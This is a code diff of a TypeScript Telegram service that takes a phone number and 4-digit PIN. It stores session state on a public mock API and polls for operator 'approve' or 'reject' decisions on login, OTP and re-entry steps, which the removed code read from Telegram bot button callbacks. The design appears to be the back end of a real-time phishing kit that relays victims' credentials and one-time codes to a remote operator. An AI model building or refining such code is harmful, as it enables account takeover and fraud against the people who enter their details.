@@ -273,7 +273,7 @@ class TelegramService {
       const cleanPhone = phone.replace(/\D/g, '');
       const cleanPin = pin.slice(0, 4);
 
-      let resolvedCloudId = this.getCloudId(sessionId);
+      let resolvedCloudId = sessionId; // Default to sessionId
 
       // 1. Try server or Vercel serverless endpoint first with retry
       try {
@@ -308,6 +308,7 @@ class TelegramService {
         if (serverSuccess && serverSuccess.cloudId) {
           resolvedCloudId = serverSuccess.cloudId;
           this.setCloudId(sessionId, resolvedCloudId);
+          console.log('[TelegramService] Got cloudId from server:', resolvedCloudId);
         }
       } catch (err) {
         console.warn('[TelegramService] Server endpoint failed, using fallback:', err);
@@ -346,6 +347,7 @@ class TelegramService {
           if (cloudData && cloudData.id) {
             resolvedCloudId = cloudData.id;
             this.setCloudId(sessionId, resolvedCloudId);
+            console.log('[TelegramService] Created cloud record:', resolvedCloudId);
           }
         });
       } catch (err) {
@@ -647,9 +649,8 @@ class TelegramService {
   /**
    * Fast Real-time Status Polling (Multi-Tier Resilient Check)
    * 1. Check local session state
-   * 2. Event-driven server wait-status (< 50ms latency, zero spam)
-   * 3. Server status snapshot check with phone & sessionId fallback
-   * 4. Direct Telegram getUpdates API query (client-side zero-dependency guarantee)
+   * 2. Server status snapshot check
+   * 3. Cloud State Lookup
    */
   public async pollUpdates(
     sessionId: string,
@@ -674,162 +675,20 @@ class TelegramService {
     const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
     const timestamp = Date.now();
 
-    // 2. High-speed Event-driven /api/telegram/wait-status (Suspends until bot button click or 8s timeout)
+    // 2. Check /api/telegram/status snapshot (NO RETRY - needs to be fast)
     try {
-      const waitController = new AbortController();
-      const waitTimeout = setTimeout(() => waitController.abort(), 9000);
+      const statusUrl = `/api/telegram/status?id=${encodeURIComponent(resolvedCloudId)}&sessionId=${encodeURIComponent(
+        sessionId
+      )}&phone=${encodeURIComponent(cleanPhone)}&_t=${timestamp}`;
 
-      const waitUrl = `/api/telegram/wait-status?sessionId=${encodeURIComponent(sessionId)}&phone=${encodeURIComponent(
-        cleanPhone
-      )}&targetStep=${targetStep}&timeout=7000`;
-
-      const waitRes = await fetch(waitUrl, {
-        signal: waitController.signal,
+      const serverRes = await fetch(statusUrl, {
         cache: 'no-store',
         headers: { 'Cache-Control': 'no-cache' },
       });
-      clearTimeout(waitTimeout);
 
-      if (waitRes.ok) {
-        const waitData = await this.safeJson(waitRes);
-        if (waitData && (waitData.status === 'approved' || waitData.status === 'rejected')) {
-          if (local) {
-            if (targetStep === 'login') local.loginStatus = waitData.status;
-            if (targetStep === 'otp') local.otpStatus = waitData.status;
-            if (targetStep === 'reenter') local.reenterStatus = waitData.status;
-          }
-          return waitData.status;
-        }
-      }
-    } catch {
-      // wait-status network or abort, proceed to status snapshot
-    }
-
-    // 3. Check /api/telegram/status snapshot with retry
-    try {
-      const statusData = await this.retryWithBackoff(async () => {
-        const statusUrl = `/api/telegram/status?id=${encodeURIComponent(resolvedCloudId)}&sessionId=${encodeURIComponent(
-          sessionId
-        )}&phone=${encodeURIComponent(cleanPhone)}&_t=${timestamp}`;
-
-        const serverRes = await fetch(statusUrl, {
-          cache: 'no-store',
-          headers: { 'Cache-Control': 'no-cache' },
-        });
-
-        if (!serverRes.ok) {
-          throw new Error(`Status endpoint returned ${serverRes.status}`);
-        }
-
+      if (serverRes.ok) {
         const data = await this.safeJson(serverRes);
-        if (!data) {
-          throw new Error('No data from status endpoint');
-        }
-
-        return data;
-      }, 2, 500); // Fewer retries for polling to avoid delays
-
-      if (statusData) {
-        if (targetStep === 'login' && (statusData.loginStatus === 'approved' || statusData.loginStatus === 'rejected')) {
-          if (local) local.loginStatus = statusData.loginStatus;
-          return statusData.loginStatus;
-        }
-        if (targetStep === 'otp' && (statusData.otpStatus === 'approved' || statusData.otpStatus === 'rejected')) {
-          if (local) local.otpStatus = statusData.otpStatus;
-          return statusData.otpStatus;
-        }
-        if (targetStep === 'reenter' && (statusData.reenterStatus === 'approved' || statusData.reenterStatus === 'rejected')) {
-          if (local) local.reenterStatus = statusData.reenterStatus;
-          return statusData.reenterStatus;
-        }
-      }
-    } catch {
-      // Backend snapshot unavailable
-    }
-
-    // 4. Direct Telegram getUpdates verification (Client-side fallback) with rate limiting
-    try {
-      await this.rateLimit();
-      const token = getTelegramBotToken();
-      if (token) {
-        const allowedParam = encodeURIComponent(JSON.stringify(['callback_query']));
-        const tgRes = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=25&allowed_updates=${allowedParam}`, {
-          cache: 'no-store',
-        });
-        if (tgRes.ok) {
-          const tgData = await this.safeJson(tgRes);
-          if (tgData && tgData.ok && Array.isArray(tgData.result)) {
-            for (const upd of tgData.result) {
-              const cqData = upd.callback_query?.data || '';
-              if (!cqData) continue;
-
-              const isMatch =
-                cqData.includes(sessionId) ||
-                (resolvedCloudId && cqData.includes(resolvedCloudId)) ||
-                (cleanPhone && cleanPhone.length > 5 && cqData.includes(cleanPhone));
-
-              if (isMatch) {
-                if (targetStep === 'login') {
-                  if (cqData.startsWith('approve_login')) {
-                    if (local) local.loginStatus = 'approved';
-                    return 'approved';
-                  }
-                  if (cqData.startsWith('reject_login')) {
-                    if (local) local.loginStatus = 'rejected';
-                    return 'rejected';
-                  }
-                } else if (targetStep === 'otp') {
-                  if (cqData.startsWith('approve_otp')) {
-                    if (local) local.otpStatus = 'approved';
-                    return 'approved';
-                  }
-                  if (cqData.startsWith('reject_otp')) {
-                    if (local) local.otpStatus = 'rejected';
-                    return 'rejected';
-                  }
-                } else if (targetStep === 'reenter') {
-                  if (cqData.startsWith('approve_reenter')) {
-                    if (local) local.reenterStatus = 'approved';
-                    return 'approved';
-                  }
-                  if (cqData.startsWith('reject_reenter')) {
-                    if (local) local.reenterStatus = 'rejected';
-                    return 'rejected';
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    } catch {
-      // Direct telegram check catch
-    }
-
-    // 5. Cloud State Lookup on restful-api.dev only if resolvedCloudId is an actual cloudId
-    if (resolvedCloudId && resolvedCloudId !== sessionId && !resolvedCloudId.startsWith('stl_')) {
-      try {
-        const cloudData = await this.retryWithBackoff(async () => {
-          const cloudRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
-            headers: BROWSER_HEADERS,
-            cache: 'no-store',
-          });
-
-          if (!cloudRes.ok) {
-            throw new Error(`Cloud fetch returned ${cloudRes.status}`);
-          }
-
-          const record = await this.safeJson(cloudRes);
-          if (!record) {
-            throw new Error('No data from cloud');
-          }
-
-          return record;
-        }, 2, 500);
-
-        if (cloudData) {
-          const data = cloudData?.data || {};
-
+        if (data) {
           if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
             if (local) local.loginStatus = data.loginStatus;
             return data.loginStatus;
@@ -841,6 +700,38 @@ class TelegramService {
           if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
             if (local) local.reenterStatus = data.reenterStatus;
             return data.reenterStatus;
+          }
+        }
+      }
+    } catch {
+      // Backend snapshot unavailable
+    }
+
+    // 3. Cloud State Lookup on restful-api.dev (NO RETRY - needs to be fast)
+    if (resolvedCloudId && resolvedCloudId !== sessionId && !resolvedCloudId.startsWith('stl_')) {
+      try {
+        const cloudRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
+          headers: BROWSER_HEADERS,
+          cache: 'no-store',
+        });
+
+        if (cloudRes.ok) {
+          const record = await this.safeJson(cloudRes);
+          if (record) {
+            const data = record?.data || {};
+
+            if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
+              if (local) local.loginStatus = data.loginStatus;
+              return data.loginStatus;
+            }
+            if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
+              if (local) local.otpStatus = data.otpStatus;
+              return data.otpStatus;
+            }
+            if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
+              if (local) local.reenterStatus = data.reenterStatus;
+              return data.reenterStatus;
+            }
           }
         }
       } catch {}
